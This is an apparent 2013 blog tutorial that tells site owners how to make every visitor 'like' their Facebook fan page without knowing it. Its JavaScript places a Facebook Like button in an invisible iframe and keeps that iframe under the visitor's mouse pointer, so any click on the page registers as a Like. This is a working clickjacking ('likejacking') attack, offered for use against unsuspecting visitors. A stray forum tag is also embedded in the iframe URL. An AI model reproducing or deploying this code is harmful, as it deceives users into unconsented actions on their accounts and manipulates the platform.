---
layout: post
title: "Facebook fan page auto Like"
date: 2013-10-02 18:24
comments: true
categories: [Facebook]
keywords: facebook, javascript, facebook fan page, facebook fan page auto like
---

<p>
  When someone click anywhere on your site they will automatically like your page, no need to put like button.
</p>

<p>
  <strong>1. Put the below code in head tag:</strong>
</p>

{% codeblock Check the body are clicked yet lang:html %}
<script src="jquery-1.9.1.js" type="text/javascript"></script>
<script type="text/javascript">
  var interval = 0;

  function updateActiveElement() {
    if($(document.activeElement).attr('id') == "fb-iframe") {
      clearInterval(interval);
      bodyClicked = true;
    }
  }

  $(function() {
    interval = setInterval("updateActiveElement();", 50);
  });

</script>
{% endcodeblock %}

<p>
  <strong>2. Put the below code in body tag:</strong>
</p>

{% codeblock Load facebook fan page like button & hide it lang:html %}
<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
  <iframe src="http://www.facebook.com/plugins/like.php?href=YOUR_PAGE_URL[/COLOR]&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fb-iframe" name="fb-iframe">
  </iframe>
</div>
{% endcodeblock %}

<p>
  And then find YOUR_PAGE_URL in src iframe and replace it with your facebook fan page url (ex: <a href="http://www.facebook.com/GeeKhmer" target="_blank">http://www.facebook.com/GeeKhmer</a>).
</p>

<p>
  <strong>3. Put the below code anywhere in html tag:</strong>
</p>

{% codeblock Set mousemove event to body & when body are clicked, it auto click on facebook like button lang:html %}
<script type="text/javascript">
  var bodyClicked = false;
  var iframeWrapper = document.getElementById('iframe-wrapper');
  var standardBody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body;


  function mouseFollower(e) {
    // for internet explorer
    if (window.event) { 
      iframeWrapper.style.top = (window.event.y - 5) + standardBody.scrollTop + 'px';
      iframeWrapper.style.left = (window.event.x - 5) + standardBody.scrollLeft + 'px';
    }
    else {
      iframeWrapper.style.top = (e.pageY-5) + 'px';
      iframeWrapper.style.left = (e.pageX-5) + 'px';
    }
  }

  document.onmousemove = function(e) {
    if(bodyClicked == false) {
      mouseFollower(e);
    }
  }
</script>
{% endcodeblock %}

<p>
  You can download the <a href="https://github.com/Bunlong/facebook_auto_like" target="_blank">source code</a> and try it out.
</p>